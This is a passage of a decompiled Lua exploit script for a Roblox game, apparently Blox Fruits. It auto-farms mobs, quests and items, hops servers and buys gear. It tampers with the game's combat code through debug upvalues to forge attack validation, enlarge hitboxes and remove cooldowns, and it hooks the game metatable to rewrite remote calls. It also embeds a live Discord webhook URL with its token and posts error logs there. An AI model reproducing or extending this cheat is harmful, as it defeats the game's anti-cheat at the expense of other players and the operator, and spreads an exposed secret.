                                if table.find(MobsCakePrince, v817.Name) and skidymf(v817) then
                                    isloaded2 = true
                                    BringMob(v817)
                                    click = true
                                    repeat
                                        wait()
                                        to(getKillVector3(v817.HumanoidRootPart.CFrame))
                                        stuff(v817)
                                    until not skidymf(v817)
                                    click = false
                                end
                            end
                            if not isloaded2 then
                                pcall(function()
                                    to(CFrame.new(- 1820.0634765625, 210.74781799316406, - 12297.49609375))
                                end)
                            end
                        elseif checkitem("God\'s Chalice") or (checkitem("Sweet Chalice") or not hophophop) then
                            if CheckSea(3) and (getPlayerLevel() > 2449 and c().Process["Auto Bone While Maxed"].Enable) then
                                set("Auto Bone While Maxed")
                                isloaded = false
                                if c().Process["Auto Hop"].Enable and (os.time() - script_time > c().Process["Auto Hop"].Delay and not checkitem("Sweet Chalice")) then
                                    HopServer()
                                    return
                                end
                                local v818, v819, v820 = pairs(getsortedmon())
                                repeat
                                    local v821
                                    v820, v821 = v818(v819, v820)
                                until v820 == nil
                                local v822, v823, v824 = pairs(getsortedmon())
                                while true do
                                    local v825
                                    v824, v825 = v822(v823, v824)
                                    if v824 == nil then
                                        break
                                    end
                                    if v825 and (skidymf(v825) and table.find(BoneMobs, v825.Name)) then
                                        isloaded = true
                                        BringMob(v825)
                                        click = true
                                        repeat
                                            wait()
                                            to(getKillVector3(v825.HumanoidRootPart.CFrame))
                                            stuff(v825)
                                        until not skidymf(v825)
                                    end
                                end
                                if not isloaded then
                                    spawn(function()
                                        to(CFrame.new(- 9504.8564453125, 172.14292907714844, 6057.259765625))
                                    end)
                                end
                            elseif not (game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible or AutoRaid) then
                                set("Level Farm")
                                if c().Process["Auto Hop"].Enable and (os.time() - script_time > c().Process["Auto Hop"].Delay and not checkitem("Sweet Chalice")) then
                                    HopServer()
                                    return
                                end
                                tick()
                                if getPlayerLevel() > 725 and CheckSea(1) then
                                    TeleportSea(2)
                                end
                                if getPlayerLevel() > 1500 and (moctui(3) or not table.find(backi, tostring(vu685.Data.Race.Value))) and (checkitem("Rengoku") or not c().Process["Force Rengoku"]) then
                                    TeleportSea(3)
                                end
                                if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible and os.time() - (check156 or os.time()) < 30 then
                                    local v826 = game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text:gsub("%s*Defeat%s*(%d*)%s*(.-)%s*%b()", "%2")
                                    os.time()
                                    if v826 ~= (MobDual2 or "") .. "s" then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                    else
                                        local v827, v828, v829 = ipairs(getsortedmon())
                                        local v830 = 0
                                        while true do
                                            local v831
                                            v829, v831 = v827(v828, v829)
                                            if v829 == nil then
                                                break
                                            end
                                            if v831.Name:gsub(" %pLv. %d+%p", "") == MobDual2 and skidymf(v831) then
                                                local _ = v831.Humanoid.Health
                                                click = true
                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v831.HumanoidRootPart.CFrame + Vector3.new(3, 35, 5)
                                            end
                                        end
                                        local v832, v833, v834 = ipairs(getsortedmon())
                                        while true do
                                            local v835
                                            v834, v835 = v832(v833, v834)
                                            if v834 == nil then
                                                break
                                            end
                                            if v835.Name:gsub(" %pLv. %d+%p", "") == MobDual2 and skidymf(v835) then
                                                local v836 = os.time()
                                                local v837 = v835.Humanoid.Health
                                                v830 = 1
                                                repeat
                                                    task.wait()
                                                    stuff(v)
                                                    to(getKillVector3(v835.HumanoidRootPart.CFrame))
                                                    BringMob(v835)
                                                until not skidymf(v835) or (not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible or os.time() - v836 > 1 and v837 <= v835.Humanoid.Health or not v826 == MobDual2 .. "s")
                                            end
                                        end
                                        if v830 == 0 then
                                            pcall(function()
                                                to(getMobLoadPos(MobDual2) + Vector3.new(0, 30, 0))
                                            end)
                                        end
                                    end
                                else
                                    GetQuest()
                                end
                            end
                        else
                            HopServer()
                        end
                    end
                    buyMelee("ElectricClaw")
                    grggrgrggrgrgrggr = {
                        ["Fish Tail"] = 20,
                        ["Magma Ore"] = 20,
                        ["Dragon Scale"] = 10,
                        ["Mystic Droplet"] = 10
                    }
                    print(0)
                    local v838, v839, v840 = pairs(grggrgrggrgrgrggr)
                    wait()
                    local v841, v842, v843 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v844
                        v843, v844 = v841(v842, v843)
                        if v843 == nil then
                            break
                        end
                        if table.find(MaterialMob, v844.Name) then
                            print(4)
                            click = true
                            BringMob(v844)
                            repeat
                                wait()
                                print(5)
                                to(getKillVector3(v844.HumanoidRootPart.CFrame))
                                stuff(v844)
                            until not skidymf(v844)
                            click = false
                        end
                    end
                    print(getMobLoadPos(MaterialMob[math.random(1, # MaterialMob)]:gsub(" %pLv. %d+%p", "")), MaterialMob[math.random(1, # MaterialMob)]:gsub(" %pLv. %d+%p", ""))
                    to(getMobLoadPos(MaterialMob[math.random(1, # MaterialMob)]:gsub(" %pLv. %d+%p", "")))
                    if v846 > CheckMaterialCount(v845) then
                    end
                    while true do
                        local v845, v846 = v838(v839, v840)
                        if v845 == nil then
                        end
                        print(v845, CheckMaterialCount(v845), v846)
                        if CheckMaterialCount(v845) < v846 then
                            break
                        end
                        v840 = v845
                    end
                    if v845 ~= "Fish Tail" then
                        if v845 ~= "Magma Ore" then
                            if v845 ~= "Dragon Scale" then
                                if v845 ~= "Mystic Droplet" then
                                    v840 = v845
                                else
                                    set("Farming Until Reach 10x Mystic Droplet")
                                    MaterialMob = {
                                        "Water Fighter [Lv. 1450]",
                                        "Sea Soldier [Lv. 1425]"
                                    }
                                    TeleportSea(2)
                                    v840 = v845
                                end
                            else
                                MaterialMob = {
                                    "Dragon Crew Archer [Lv. 1600]",
                                    "Dragon Crew Warrior [Lv. 1575]"
                                }
                                set("Farming Until Reach 10x Dragon Scale")
                                TeleportSea(3)
                                v840 = v845
                            end
                        else
                            MaterialMob = {
                                "Magma Ninja [Lv. 1175]"
                            }
                            set("Farming Until Reach 20x Magma Ore")
                            TeleportSea(2)
                            v840 = v845
                        end
                    else
                        print(3)
                        MaterialMob = {
                            "Fishman Raider [Lv. 1775]",
                            "Fishman Captain [Lv. 1800]"
                        }
                        set("Farming Until Reach 20x Fish Tail")
                        TeleportSea(3)
                        v840 = v845
                    end
                end, function(...)
                    mii = {
                        ...
                    }
                    miii = mii[1]
                    writefile("conmemaydi.txt", (readfile("conmemaydi.txt") or " ") .. "\n" .. (miii or " cant log") .. " | " .. (tostring(m1) or "no") .. " | " .. (tostring(m2) or "no"))
                    warn(...)
                    spawn(function()
                        PostWebhook("https://discord.com/api/webhooks/1148250879070310531/eOkXIZsij1FxJaEJHLfZaUvzWgD2NtMZa64HUeslwBcXPA7mwrc2DjfnlP9A2Y9MihiD", buglog(miii))
                    end)
                end)
                miii = v848
                ayuu = v847
            end
        end)
        spawn(function()
            while not ggggggggggg or wait(7200) do
                ggggggggggg = true
                local v849, v850, v851 = pairs(c().Fruit.Snipe)
                while true do
                    local v852
                    v851, v852 = v849(v850, v851)
                    if v851 == nil then
                        break
                    end
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetFruits")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseRawFruit", v852)
                end
            end
        end)
        spawn(function()
            while true do
                if not task.wait() then
                    return
                end
                pcall(function()
                    waid1:SetText(m1 or "none")
                    waid2:SetText(m2 or "none")
                end)
                local v853, v854 = pcall(function()
                    if checkitem("Fire Essence") then
                        buyMelee("DragonTalon")
                    end
                    if getPlayerLevel() >= 2449 then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk", "Buy")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Geppo")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Buso")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Soru")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Dual Katana")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Cutlass")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Refined Slingshot")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Refined Flintlock")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Dual-Headed Blade")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Iron Mace")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Black Cape")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Bisento")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Tomoe Ring")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Katana")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Triple Katana")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Pipe")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Soul Cane")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Tomoe Ring")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Black Cape")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Swordsman Hat")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Slingshot")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Musket")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Flintlock")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Refined Flintlock")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem", "Cannon")
                    end
                end)
                z = v854
                gayz = v853
                inv = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
                giunhabatman()
                if not game.Players.LocalPlayer.Character:FindFirstChild("Spin") then
                    local v855 = Instance.new("BodyAngularVelocity")
                    v855.Name = "Spin"
                    v855.Parent = game.Players.LocalPlayer.Character
                    v855.MaxTorque = Vector3.new(0, math.huge, 0)
                    v855.AngularVelocity = Vector3.new(0, 40, 0)
                end
                if getgenv().ForceStop then
                    return
                end
                getMeleeMastery()
                spawn(function()
                    if c().Fruit["Random Fruit"] then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin", "Buy")
                    end
                    local v856 = {
                        "AddPoint",
                        autopoint(),
                        300
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(v856))
                    storefruit()
                end)
                if checkitem("Flower 3") then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "3")
                end
                if eltrul["Black Leg"] < 300 and NameMelee(true) ~= "Black Leg" then
                    buyMelee("BlackLeg")
                    set1("Waiting For Black Leg Hit 300 Mastery")
                end
                if eltrul["Black Leg"] > 299 and eltrul.Electro < 299 then
                    buyMelee("Electro")
                    set1("Waiting For Electro Hit 300 Mastery")
                end
                if eltrul.Electro > 299 and eltrul["Fishman Karate"] < 299 then
                    buyMelee("FishmanKarate")
                    set1("Waiting For Fishman Karate Hit 300 Mastery")
                end
                if eltrul["Fishman Karate"] > 299 and eltrul["Dragon Claw"] < 299 then
                    set1("Waiting For Dragon Claw Hit 300 Mastery")
                    if vu685.Data.Fragments.Value < 1500 and (NameMelee(true).Name ~= "Dragon Claw" and not checkMelee("Dragon Claw")) then
                        if CheckSea(1) then
                            set1("Waiting For 2nd Sea (For Dragon Claw / Not Enough Fragments)")
                            TeleportSea(2)
                        else
                            AutoRaid = true
                            PullFruit = true
                            set1("Waiting For Dragon Claw Hit 300 Mastery")
                        end
                    end
                    buyMelee("DragonClaw")
                    set1("Waiting For Dragon Claw Hit 300 Mastery")
                end
                if eltrul["Dragon Claw"] > 299 and eltrul.Superhuman < 400 then
                    buyMelee("Superhuman")
                    set1("Waiting For Superhuman Hit 300 Mastery")
                end
                print("ok", eltrul.Superhuman, eltrul["Death Step"])
                if eltrul.Superhuman > 399 and eltrul["Death Step"] < 400 then
                    print("ok2")
                    if eltrul["Black Leg"] >= 400 then
                        if checkMelee("DeathStep") then
                            set1("Waiting For Death Step Hit 300 Mastery")
                            buyMelee("DeathStep")
                        elseif getPlayerFragments() >= 5000 or (NameMelee() == "Death Step" or checkMelee("DeathStep")) then
                            set1("Waiting For Player Beli Hit 3M+ [Death Step]")
                            if getPlayerBeli() > 3000000 then
                                buyMelee("DeathStep")
                            end
                        else
                            AutoRaid = true
                            PullFruit = true
                        end
                    else
                        buyMelee("BlackLeg")
                        set1("Waiting For Black Leg Hit 300 Mastery")
                    end
                end
                if eltrul["Death Step"] > 399 and eltrul["Sharkman Karate"] < 400 then
                    if eltrul["Fishman Karate"] >= 400 then
                        if checkMelee("SharkmanKarate") then
                            buyMelee("SharkmanKarate")
                            set1("Waiting For Sharkman Karare Hit 300 Mastery")
                        elseif getPlayerFragments() >= 5000 then
                            set1("Waiting For Beli Hit 3M+ [Sharkman Karare]")
                            if getPlayerBeli() > 3000000 then
                                buyMelee("SharkmanKarate")
                            end
                        else
                            AutoRaid = true
                            set1("Auto Raid Until Reach 5k Fragments")
                            PullFruit = true
                        end
                    else
                        buyMelee("FishmanKarate")
                        set1("Waiting For Fishman Karate Hit 300 Mastery")
                    end
                end
                if eltrul["Sharkman Karate"] > 399 and eltrul["Electric Claw"] < 400 then
                    if eltrul.Electro >= 400 then
                        if not checkMelee("FishmanKarate") and getPlayerFragments() < 5000 then
                            AutoRaid = true
                            PullFruit = true
                        end
                        buyMelee("ElectricClaw")
                        set1("Waiting For Player Beli Hit 3M+ [Electric Claw]")
                    else
                        buyMelee("Electro")
                        set1("Waiting For Electro Hit 300 Mastery")
                    end
                end
                if eltrul["Electric Claw"] > 399 and eltrul["Dragon Talon"] < 400 then
                    if eltrul["Dragon Claw"] >= 400 then
                        if checkMelee("DragonTalon") or getPlayerFragments() >= 5000 then
                            set1("Waiting For Dragon Talon Requirements [3M+ Beli / Fire Essence]")
                            buyMelee("DragonTalon")
                        else
                            AutoRaid = true
                            PullFruit = true
                            set1("Auto Raiding Until Hit 5k Fragments [Dragon Talon]")
                        end
                    else
                        set1("Waiting For Dragon Claw Hit 300 Mastery")
                        buyMelee("DragonClaw")
                    end
                end
                if eltrul.Superhuman > 399 and (eltrul["Death Step"] > 399 and (eltrul["Electric Claw"] > 399 and (eltrul["Dragon Talon"] > 399 and eltrul["Sharkman Karate"] > 399))) then
                    if checkMelee("Godhuman") then
                        if eltrul.Godhuman >= 400 then
                            local v857, v858, v859 = pairs(inv)
                            while true do
                                local v860
                                v859, v860 = v857(v858, v859)
                                if v859 == nil then
                                    break
                                end
                                if v860.Type == "Sword" then
                                    mas = 0
                                    local v861, v862, v863 = pairs(v860.MasteryRequirements)
                                    while true do
                                        local v864
                                        v863, v864 = v861(v862, v863)
                                        if v863 == nil then
                                            break
                                        end
                                        mas = tonumber(v864)
                                    end
                                    if v860.Mastery < mas then
                                        forcewp = "Sword"
                                        if not checkitem2(v860.Name) then
                                            local v865 = {
                                                "LoadItem",
                                                v860.Name
                                            }
                                            set1("Farming Mastery For " .. v860.Name .. " [" .. v860.Mastery .. "/" .. mas .. "]")
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(v865))
                                        end
                                        break
                                    end
                                end
                            end
                        else
                            buyMelee("Godhuman")
                        end
                    else
                        buyMelee("ElectricClaw")
                        if getPlayerFragments() < 5000 and not checkMelee("Godhuman") then
                            set1("Auto Raid Until Hit 5k Fragments [Godhuman]")
                            AutoRaid = true
                            PullFruit = true
                        end
                        set1("Waiting For Player Beli Hit 5M+ [Godhuman]")
                        buyMelee("Godhuman")
                    end
                end
            end
        end)
        local vu866 = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework")))[2]
        local v867 = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
        local vu868 = getupvalues(v867)[2]
        local v869 = require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework.RigController)
        local _ = getupvalues(v869)[2]
        require(game.ReplicatedStorage.CombatFramework.RigLib)
        tick()
        function CameraShaker()
            task.spawn(function()
                local vu870 = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework.CameraShaker)
                while wait() do
                    pcall(function()
                        vu870.CameraShakeInstance.CameraShakeState.Inactive = 0
                    end)
                end
            end)
        end
        function CurrentWeapon()
            local vu871 = vu868.activeController.blades[1]
            if not vu871 then
                return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
            end
            pcall(function()
                while vu871.Parent ~= game.Players.LocalPlayer.Character do
                    vu871 = vu871.Parent
                end
            end)
            return vu871 or game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        function getAllBladeHitsPlayers(p872)
            Hits = {}
            local v873 = game.Players.LocalPlayer
            local v874 = game:GetService("Workspace").Characters:GetChildren()
            for v875 = 1, # v874 do
                local v876 = v874[v875]
                Human = v876:FindFirstChildOfClass("Humanoid")
                if v876.Name ~= game.Players.LocalPlayer.Name then
                    if Human then
                        if Human.RootPart then
                            if Human.Health > 0 then
                                if v873:DistanceFromCharacter(Human.RootPart.Position) < p872 + 5 then
                                    table.insert(Hits, Human.RootPart)
                                end
                            end
                        end
                    end
                end
            end
            return Hits
        end
        function getAllBladeHits(p877)
            Hits = {}
            local v878 = game.Players.LocalPlayer
            local v879 = game:GetService("Workspace").Enemies:GetChildren()
            for v880 = 1, # v879 do
                Human = v879[v880]:FindFirstChildOfClass("Humanoid")
                if Human then
                    if Human.RootPart then
                        if Human.Health > 0 then
                            if v878:DistanceFromCharacter(Human.RootPart.Position) < p877 + 5 then
                                table.insert(Hits, Human.RootPart)
                            end
                        end
                    end
                end
            end
            return Hits
        end
        ReturnFunctions = {}
        function CurrentWeapon()
            local vu881 = vu868.activeController.blades[1]
            if not vu881 then
                return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
            end
            pcall(function()
                while vu881.Parent ~= game.Players.LocalPlayer.Character do
                    vu881 = vu881.Parent
                end
            end)
            return vu881 or game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        function getAllBladeHitsPlayers(p882)
            Hits = {}
            local v883 = game.Players.LocalPlayer
            local v884 = game:GetService("Workspace").Characters:GetChildren()
            for v885 = 1, # v884 do
                local v886 = v884[v885]
                Human = v886:FindFirstChildOfClass("Humanoid")
                if v886.Name ~= game.Players.LocalPlayer.Name then
                    if Human then
                        if Human.RootPart then
                            if Human.Health > 0 then
                                if v883:DistanceFromCharacter(Human.RootPart.Position) < p882 + 5 then
                                    table.insert(Hits, Human.RootPart)
                                end
                            end
                        end
                    end
                end
            end
            return Hits
        end
        function lonmemaytofff(p887)
            Hits = {}
            local v888 = game.Players.LocalPlayer
            local v889 = game:GetService("Workspace").Enemies:GetChildren()
            for v890 = 1, # v889 do
                Human = v889[v890]:FindFirstChildOfClass("Humanoid")
                if Human then
                    if Human.RootPart then
                        if Human.Health > 0 then
                            if Human.Health ~= Human.MaxHealth then
                                if v888:DistanceFromCharacter(Human.RootPart.Position) < p887 + 5 then
                                    table.insert(Hits, Human.RootPart)
                                end
                            end
                        end
                    end
                end
            end
            return Hits
        end
        function AttackFunctgggggion()
            pcall(function()
                if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
                    return nil
                end
                local v891 = vu868.activeController
                v891.hitboxMagnitude = 55
                if v891 and v891.equipped then
                    for _ = 1, 1 do
                        local v892 = require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(game.Players.LocalPlayer.Character, {
                            game.Players.LocalPlayer.Character.HumanoidRootPart
                        }, 60)
                        if # v892 > 0 then
                            local vu893 = debug.getupvalue(v891.attack, 5)
                            local vu894 = debug.getupvalue(v891.attack, 6)
                            local vu895 = debug.getupvalue(v891.attack, 4)
                            local v896 = debug.getupvalue(v891.attack, 7)
                            local vu897 = (vu893 * 798405 + vu895 * 727595) % vu894
                            local vu898 = vu895 * 798405
                            (function()
                                vu897 = (vu897 * vu894 + vu898) % 1099511627776
                                vu893 = math.floor(vu897 / vu894)
                                vu895 = vu897 - vu893 * vu894
                            end)()
                            local v899 = v896 + 1
                            debug.setupvalue(v891.attack, 5, vu893)
                            debug.setupvalue(v891.attack, 6, vu894)
                            debug.setupvalue(v891.attack, 4, vu895)
                            debug.setupvalue(v891.attack, 7, v899)
                            local v900, v901, v902 = pairs(v891.animator.anims.basic)
                            local v903 = vu897
                            while true do
                                local v904
                                v902, v904 = v900(v901, v902)
                                if v902 == nil then
                                    break
                                end
                                v904:Play()
                            end
                            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and (v891.blades and v891.blades[1]) then
                                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange", tostring(CurrentWeapon()))
                                game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(v903 / 1099511627776 * 16777215), v899 + 1)
                                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", v892, 2, "")
                            end
                        end
                    end
                end
            end)
        end
        spawn(function()
            while task.wait(c().Misc["Fast Attack Delay"]) do
                pcall(function()
                    AttackFunctgggggion()
                    ot = tick()
                    if vu866.activeController then
                        vu866.activeController.timeToNextAttack = math.huge
                        vu866.activeController.focusStart = 0
                        vu866.activeController.hitboxMagnitude = 120
                        vu866.activeController.humanoid.AutoRotate = true
                        vu866.activeController.increment = 2
                    end
                end)
            end
        end)
        game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(p905)
            if p905.Name == "ErrorPrompt" and p905:FindFirstChild("MessageArea") and p905.MessageArea:FindFirstChild("ErrorFrame") then
                print("Genshin | Rejoin!")
                game:GetService("TeleportService"):Teleport(game.PlaceId)
            end
        end)
        spawn(function()
            local v906 = getrawmetatable(game)
            local vu907 = v906.__namecall
            setreadonly(v906, false)
            v906.__namecall = newcclosure(function(...)
                local v908 = getnamecallmethod()
                local v909 = {
                    ...
                }
                if tostring(v908) ~= "FireServer" or (tostring(v909[1]) ~= "RemoteEvent" or (tostring(v909[2]) == "true" or (tostring(v909[2]) == "false" or not dmlockskill))) then
                    return vu907(...)
                end
                v909[2] = dmlockskill
                return vu907(unpack(v909))
            end)
        end)
        return
    end
until game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("ChooseTeam")

wait()
if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
    local v910, v911, v912 = pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated))
    while true do
        local v913
        v912, v913 = v910(v911, v912)
        if v912 == nil then
            break
        end
        v913.Function()
    end
end
if game.Players.LocalPlayer.Team == nil then
	
else
	
end